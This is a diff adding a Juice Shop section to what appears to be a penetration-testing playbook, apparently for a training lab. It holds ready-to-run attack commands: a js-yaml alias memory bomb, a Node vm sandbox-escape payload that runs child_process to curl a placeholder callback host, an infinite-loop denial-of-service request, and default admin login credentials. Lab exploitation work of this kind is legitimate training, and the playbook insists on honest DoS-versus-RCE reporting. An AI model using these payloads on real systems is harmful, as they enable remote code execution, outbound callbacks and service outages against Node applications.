@@ -144,6 +144,75 @@ grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .
 # Use ruby-advisory-db gadgets
 ```
 
+### Phase 7 — Node / JavaScript (OWASP Juice Shop)
+
+Juice Shop is a Node/Express app (SQLite backend; auto-CRUD REST at `/api/{Model}`,
+hand-rolled endpoints at `/rest/{noun}`; route guards/validation are Angular client-side
+only, so the server still parses whatever you POST). The deserialization-class sinks here
+are the **B2B order ingestion** endpoint, which feeds an untrusted body into a Node `vm`/`vm2`
+sandbox, and **YAML/coupon file processing**, which feeds attacker text into `js-yaml`. These
+unlock three challenges: **Blocked RCE DoS**, **Successful RCE DoS**, and **Memory Bomb**.
+Base URL: `http://localhost:3000`.
+
+**7a — `js-yaml` Billion-Laughs / quadratic YAML bomb (Memory Bomb)**
+
+`js-yaml.load()` (and old `safeLoad`) expands YAML anchors/aliases (`&a` / `*a`) before any
+schema check, so a nested-alias bomb explodes in memory regardless of the client-side
+validation. Juice Shop exposes this via the B2B order ingestion / file-upload parser.
+```bash
+# Build a quadratic alias bomb (anchors referenced 9-deep → ~N^9 expansion)
+cat > /tmp/bomb.yml <<'YAML'
+a: &a ["aaaaaaaaaa","aaaaaaaaaa","aaaaaaaaaa","aaaaaaaaaa","aaaaaaaaaa","aaaaaaaaaa","aaaaaaaaaa","aaaaaaaaaa","aaaaaaaaaa"]
+b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
+c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
+d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
+e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
+f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
+g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
+h: [*g,*g,*g,*g,*g,*g,*g,*g,*g]
+YAML
+
+# B2B order processing parses the uploaded YAML (multipart) → server heap blows up.
+# Time the request: a server hang / killed worker / timeout IS the proof here.
+time curl -s -o /dev/null -w '%{http_code} %{time_total}s\n' \
+  -F "file=@/tmp/bomb.yml;type=application/x-yaml" \
+  http://localhost:3000/file-upload
+```
+
+**7b — Node `vm` / `vm2` / `notevil` sandbox-escape RCE + infinite-loop DoS (Blocked / Successful RCE DoS)**
+
+The B2B order body is evaluated inside a Node `vm` context. `vm` is **not** a security
+boundary: the legacy `arguments.callee.caller` / `constructor.constructor("return process")()`
+escape reaches the real `process` and `child_process`. Juice Shop wraps it in a timeout, so:
+- An **infinite loop** that the timeout *catches* → **Blocked RCE DoS**.
+- An **infinite loop that runs long enough to hang the worker** past the guard → **Successful RCE DoS**.
+```bash
+# Auth first (Juice Shop issues a JWT on login)
+TOKEN=$(curl -s http://localhost:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
+  | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
+
+# Sandbox-escape probe — OOB proof: have the escaped process curl your collaborator.
+# (orderLinesData is the field fed into the vm; payload is a JS string, not JSON data)
+curl -s http://localhost:3000/b2b/v2/orders \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"orderLinesData":"(function(){return this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"curl http://COLLAB_HOST/vm-escape\")})()"}'
+
+# Infinite-loop DoS variant — measured server hang is the proof, NOT a callback.
+# Frame this honestly as DoS (challenge: Blocked/Successful RCE DoS), never as RCE.
+time curl -s -o /dev/null -w '%{http_code} %{time_total}s\n' \
+  http://localhost:3000/b2b/v2/orders \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"orderLinesData":"while(true){}"}'
+```
+
+> Proof split for the JS branch: **7b sandbox-escape** must clear the existing OOB/command-output
+> kill gate (collaborator hit or `process`/`child_process` output) before you call it RCE. The
+> **YAML bomb (7a)** and the **infinite-loop (7b DoS)** have **no callback and no command output** —
+> their only proof is a measured server hang / killed worker / request timeout. Report those two as
+> **DoS**, never as RCE. (See the kill gate below — a hang alone is DoS-at-most.)
+
 ---
 
 ## Chain Table
@@ -154,6 +223,8 @@ grep -r "Marshal.load\|Marshal.restore" --include="*.rb" .
 | RCE as low-privilege user | Find SUID binaries / sudo rules | Privilege escalation → root |
 | Blind RCE (OOB callback) | DNS callback → confirm exec | Sufficient for Critical PoC |
 | Log4Shell | LDAP → JNDI → class load | Full RCE on JVM process |
+| Node `vm`/`vm2` escape (Juice Shop B2B) | `constructor.constructor` → `process` → `child_process` | RCE only with OOB/output proof |
+| `js-yaml` alias bomb / `vm` infinite loop | Heap blowup / worker hang | **DoS only** — measured server hang is the proof (Memory Bomb, Blocked/Successful RCE DoS) |
 
 ---
 
